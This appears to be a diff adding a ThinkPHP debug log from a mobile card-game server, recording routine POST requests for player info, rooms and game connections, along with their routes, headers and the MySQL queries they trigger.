+[ info ] [ ROUTE ] array (
+  'type' => 'controller',
+  'controller' => 'home/Game/connect',
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'charset' => 'UTF-8',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0.2; vivo Y35 Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'host' => 'card.dcwen.top',
+  'content-length' => '52',
+)
+[ info ] [ PARAM ] array (
+  '/connect' => '',
+  'client_id' => '7f0000010fa20000001e',
+  'cid' => 'AJ-Ts',
+  'type' => 'outter',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Game->connect[ /var/www/card/app/home/controller/Game.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001317s ] mysql:dbname=runfast;host=localhost;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_options` [ RunTime:0.000703s ]
+[ sql ] [ SQL ] SELECT `is_close` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000170s ]
+---------------------------------------------------------------
+[ 2017-10-01T11:45:16+08:00 ] 172.16.0.5 139.207.190.33 POST /player_info
+[ info ] card.dcwen.top/player_info [运行时间：0.007380s][吞吐率：135.50req/s] [内存消耗：715.09kb] [文件加载：55]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'controller',
+  'controller' => 'home/Player/get_player_info',
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'charset' => 'UTF-8',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G9350 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.106 Mobile Safari/537.36',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'host' => 'card.dcwen.top',
+  'content-length' => '9',
+)
+[ info ] [ PARAM ] array (
+  '/player_info' => '',
+  'cid' => '8f0US',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Player->get_player_info[ /var/www/card/app/home/controller/Player.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000210s ] mysql:dbname=runfast;host=localhost;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_options` [ RunTime:0.001009s ]
+[ sql ] [ SQL ] SELECT `is_close` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000161s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_player` [ RunTime:0.000525s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_player` WHERE  `player_id` = 7 LIMIT 1 [ RunTime:0.000234s ]
+---------------------------------------------------------------
+[ 2017-10-01T11:45:17+08:00 ] 172.16.0.5 139.207.190.33 POST /player_info
+[ info ] card.dcwen.top/player_info [运行时间：0.006376s][吞吐率：156.84req/s] [内存消耗：715.10kb] [文件加载：55]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'controller',
+  'controller' => 'home/Player/get_player_info',
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'charset' => 'UTF-8',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G9350 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.106 Mobile Safari/537.36',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'host' => 'card.dcwen.top',
+  'content-length' => '9',
+)
+[ info ] [ PARAM ] array (
+  '/player_info' => '',
+  'cid' => 'PcHBl',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Player->get_player_info[ /var/www/card/app/home/controller/Player.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000267s ] mysql:dbname=runfast;host=localhost;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_options` [ RunTime:0.000770s ]
+[ sql ] [ SQL ] SELECT `is_close` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000180s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_player` [ RunTime:0.000598s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_player` WHERE  `player_id` = 7 LIMIT 1 [ RunTime:0.000148s ]
+---------------------------------------------------------------
+[ 2017-10-01T11:45:17+08:00 ] 172.16.0.5 139.207.190.33 POST /news_show
+[ info ] card.dcwen.top/news_show [运行时间：0.002900s][吞吐率：344.81req/s] [内存消耗：548.45kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'controller',
+  'controller' => 'home/Home/home_page',
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'charset' => 'UTF-8',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G9350 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.106 Mobile Safari/537.36',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'host' => 'card.dcwen.top',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+  '/news_show' => '',
+)
+[ info ] [ RUN ] app\home\controller\Home->home_page[ /var/www/card/app/home/controller/Home.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T11:45:17+08:00 ] 172.16.0.5 139.207.190.33 POST /room_page
+[ info ] card.dcwen.top/room_page [运行时间：0.015520s][吞吐率：64.43req/s] [内存消耗：743.94kb] [文件加载：56]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'controller',
+  'controller' => 'home/Room/room_page',
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'charset' => 'UTF-8',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G9350 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.106 Mobile Safari/537.36',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'host' => 'card.dcwen.top',
+  'content-length' => '9',
+)
+[ info ] [ PARAM ] array (
+  '/room_page' => '',
+  'cid' => 'PcHBl',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Room->room_page[ /var/www/card/app/home/controller/Room.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001430s ] mysql:dbname=runfast;host=localhost;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_options` [ RunTime:0.000820s ]
+[ sql ] [ SQL ] SELECT `is_close` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000184s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_room` [ RunTime:0.000580s ]
+[ sql ] [ SQL ] SELECT `room_id`,`round_times`,`room_code` FROM `edd_room` WHERE  `room_owner` = 7  AND `del_time` = '0' [ RunTime:0.000172s ]
+---------------------------------------------------------------
+[ 2017-10-01T11:45:17+08:00 ] 172.16.0.5 139.207.190.33 POST /connect
+[ info ] card.dcwen.top/connect [运行时间：0.010587s][吞吐率：94.46req/s] [内存消耗：733.05kb] [文件加载：56]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'controller',
+  'controller' => 'home/Game/connect',
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'charset' => 'UTF-8',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G9350 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.106 Mobile Safari/537.36',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'host' => 'card.dcwen.top',
+  'content-length' => '52',
+)
+[ info ] [ PARAM ] array (
+  '/connect' => '',
+  'client_id' => '7f0000010fa20000001f',
+  'cid' => 'PcHBl',
+  'type' => 'outter',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Game->connect[ /var/www/card/app/home/controller/Game.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001409s ] mysql:dbname=runfast;host=localhost;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_options` [ RunTime:0.000689s ]
+[ sql ] [ SQL ] SELECT `is_close` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000146s ]
